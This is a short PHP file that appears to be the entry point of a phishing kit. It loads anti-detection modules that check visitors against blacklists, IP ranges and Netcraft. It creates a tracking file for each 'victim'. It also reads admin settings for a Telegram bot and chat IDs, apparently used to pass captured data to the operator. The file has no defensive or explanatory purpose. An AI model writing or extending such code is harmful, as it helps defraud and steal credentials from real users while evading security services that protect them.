<?php 
error_reporting(0);
@session_start();
require (__DIR__).'/config.php';
require (__DIR__).'/lib/frm.php';
require (__DIR__).'/antis/cb.php';
require (__DIR__).'/antis/blacklist_lookup.php';
require (__DIR__).'/antis/ip_range_check.php';
require (__DIR__).'/antis/netcraft_check.php';

$ajaxPath = "../panel/classes/processor.php";
require (__DIR__).'/panel/classes/mother.class.php';
require (__DIR__).'/panel/classes/admin.class.php';
$admin_json_file = (__DIR__).'/panel/data/admin.json';
$ip = $_SERVER['REMOTE_ADDR'];
if($ip=="::1"){
	$ip="127.0.0.1";
}

$m = new Mother;
$vicFile = $m->getFileId();
$m->createVic();
$m->setDataFile($vicFile);


$admin=new Admin;
$admin->setDataFile($admin_json_file);
$a_bot =  $admin->getData()["settings"]["telegram_bot"];
$a_ids =  $admin->getData()["settings"]["telegram_id"];
$block_pc =  $admin->getData()["settings"]["pc_block"];
$shutdown =  $admin->getData()["settings"]["shutdown"];
$notifs = $admin->getData()["settings"]["notifications"];

if($shutdown==1){
	exit;
}


function setError($msg){
    if(isset($_GET['e'])){
        echo '<div class="error">'.$msg.'</div>';
    }
}




?>